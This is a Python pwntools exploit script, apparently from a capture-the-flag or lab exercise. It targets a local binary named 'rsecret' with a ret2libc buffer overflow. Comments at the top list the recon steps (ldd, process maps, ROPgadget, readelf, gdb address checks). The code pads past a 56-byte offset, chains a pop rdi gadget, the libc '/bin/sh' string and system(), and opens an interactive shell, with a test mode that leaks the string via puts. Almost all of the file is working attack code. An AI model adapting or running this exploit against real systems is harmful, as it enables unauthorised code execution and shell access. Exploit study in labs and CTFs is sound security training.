#!/usr/bin/python3

# ldd {vuln} -> /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dcb000)
# ps -aux | grep {vuln}
# cat /proc/{pid}/maps
# libc base address: 0x00007ffff7dcb000
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret" -> 0x0000000000027c65
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/bin/sh" -> 0x000000000019604f
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts -> 0x0000000000075b00

# check address:
# xxd -l 8 /lib/x86_64-linux-gnu/libc.so.6
# (gdb) x/2x 0x7ffff7dcb000
# (gdb) x/x 0x7ffff7df2c65 -> 0x0f66c35f
# (gdb) x/x 0x7ffff7f6104f -> 0x6e69622f
# (gdb) x/x 0x7ffff7f61053 -> 0x0068732f
# (gdb) x/x 0x7ffff7e40b00

from pwn import *
from pprint import pprint

test_mode = False

target = ["./rsecret"]
offset = 56

context.arch = "amd64"
context.update(os = "linux")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF(target[0])
pprint(elf.symbols)

rop = ROP(elf)

rop_libc = ROP(libc)

BIN_SH = next(libc.search(b"/bin/sh\x00"))
POP_RDI = rop_libc.find_gadget(["pop rdi", "ret"])[0]
PUTS_LIBC = libc.symbols["puts"]
SYSTEM_LIBC = libc.symbols["system"]

libc_base = 0x7ffff7dcb000
bin_sh = libc_base + BIN_SH
pop_rdi = libc_base + POP_RDI
puts_libc = libc_base + PUTS_LIBC
system_libc = libc_base + SYSTEM_LIBC

print("-" * 100)
print("libc base address: " + hex(libc_base))
print("/bin/sh at: " + hex(bin_sh))
print("pop rdi gadget at: " + hex(pop_rdi))
print("puts at: " + hex(puts_libc))
print("system at: " + hex(system_libc))
print("-" * 100)

rop_leak = p64(pop_rdi) + p64(bin_sh) + p64(puts_libc)
rop_exec = p64(pop_rdi) + p64(bin_sh) + p64(system_libc)

rop.call(elf.symbols["main"])

test = [
    b"A" * offset,
    rop_leak,
    rop.chain()
]

exploit = [
    b"A" * offset,
    rop_leak,
    rop_exec
]

if test_mode:
    print("test mode")
    print("-" * 100)
    payload = b"".join(test)
else:
    print("exploit mode")
    print("-" * 100)
    payload = b"".join(exploit)

p = process(target)

p.recvuntil("\n")
p.sendline(payload)
# received = p.recvline().rstrip()
# leaked = u64(received.ljust(8, b"\x00"))
# print("leaked: " + hex(leaked))
p.interactive()
